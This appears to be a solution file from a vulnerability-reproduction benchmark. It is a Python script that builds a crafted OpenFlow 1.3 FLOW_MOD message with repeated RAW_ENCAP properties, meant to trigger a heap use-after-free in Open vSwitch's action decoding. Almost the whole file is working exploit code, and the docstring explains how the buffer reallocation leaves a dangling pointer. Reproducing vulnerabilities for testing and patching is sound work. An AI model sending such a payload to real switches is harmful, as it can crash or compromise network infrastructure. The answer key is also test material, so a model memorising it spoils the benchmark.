import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC for a Heap Use After Free vulnerability in Open vSwitch.
        CVE-2018-1065, arvo:27851

        The vulnerability exists in the decoding of RAW_ENCAP actions. When an
        OFPT_FLOW_MOD message is processed, actions can be decoded in-place.
        The `decode_nx_encap_decap` function processes properties within a
        RAW_ENCAP action. If decoding a property causes the underlying OpenFlow
        buffer (`ofpbuf`) to be reallocated, a pointer (`encap`) to the action
        header becomes a dangling pointer. Subsequent access to this pointer
        within the property processing loop leads to a use-after-free.

        To trigger this, we construct an OFPT_FLOW_MOD message containing an
        OFPIT_APPLY_ACTIONS instruction. This instruction contains a single
        NXAST_RAW_ENCAP action. The action is populated with enough properties
        (e.g., NX_ENCAP_PROP_ETHERNET_DST) to ensure that their decoded
        representation overflows the initial small buffer allocated for
        `ofpacts`, forcing a reallocation and triggering the UAF.

        A typical initial buffer size is 64 bytes, and each decoded property
        takes about 24-32 bytes. Three properties are used to reliably exceed
        this threshold.
        """

        # OpenFlow 1.3 Constants
        OFP_VERSION = 0x04
        OFPT_FLOW_MOD = 14
        OFPFC_ADD = 0
        OFP_NO_BUFFER = 0xffffffff
        OFPP_ANY = 0xffffffff
        OFPG_ANY = 0xffffffff
        OFPMT_OXM = 1
        OFPIT_APPLY_ACTIONS = 4
        OFPAT_VENDOR = 0xffff
        NX_VENDOR_ID = 0x00002320
        NXAST_RAW_ENCAP = 35
        NX_ENCAP_PROP_ETHERNET_DST = 2

        # Three properties are used to trigger reallocation on a typical small
        # buffer (e.g. 64 bytes).
        prop_header = struct.pack('!HH', NX_ENCAP_PROP_ETHERNET_DST, 12)
        prop_payload = b'\xde\xad\xbe\xef\xca\xfe' + b'\x00\x00'
        prop = prop_header + prop_payload
        properties = prop * 3 # 3 properties * 12 bytes/prop = 36 bytes

        # NXAST_RAW_ENCAP action containing the properties
        action_header_size = 16
        action_len = action_header_size + len(properties) # 16 + 36 = 52 bytes
        # Action length must be 8-byte aligned
        padded_action_len = (action_len + 7) & ~7 # Round up to nearest 8 -> 56 bytes
        action_padding = b'\x00' * (padded_action_len - action_len)
        
        action_header = struct.pack(
            '!HHIH', OFPAT_VENDOR, padded_action_len, NX_VENDOR_ID, NXAST_RAW_ENCAP
        ) + b'\x00' * 6
        
        action = action_header + properties + action_padding

        # OFPIT_APPLY_ACTIONS instruction containing our crafted action
        inst_header_size = 8 # type, len, and 4-byte padding
        inst_len = inst_header_size + len(action) # 8 + 56 = 64 bytes
        inst_header = struct.pack('!HH', OFPIT_APPLY_ACTIONS, inst_len) + b'\x00' * 4
        instruction = inst_header + action

        # OFPT_FLOW_MOD message header part (before match and instructions)
        flow_mod_header_part = struct.pack(
            '!QQBBHHHIIIHH',
            0, 0,                      # cookie, cookie_mask
            0, OFPFC_ADD,              # table_id, command
            0, 0, 0,                   # idle_timeout, hard_timeout, priority
            OFP_NO_BUFFER, OFPP_ANY, OFPG_ANY, # buffer_id, out_port, out_group
            0, 0                       # flags, pad[2]
        )

        # Empty OFP_MATCH field
        match = struct.pack('!HH', OFPMT_OXM, 4) + b'\x00' * 4

        # Assemble the full OpenFlow message
        msg_body = flow_mod_header_part + match + instruction
        ofp_header_size = 8
        msg_len = ofp_header_size + len(msg_body)
        
        ofp_header = struct.pack('!BBHI', OFP_VERSION, OFPT_FLOW_MOD, msg_len, 0)

        poc = ofp_header + msg_body
        
        return poc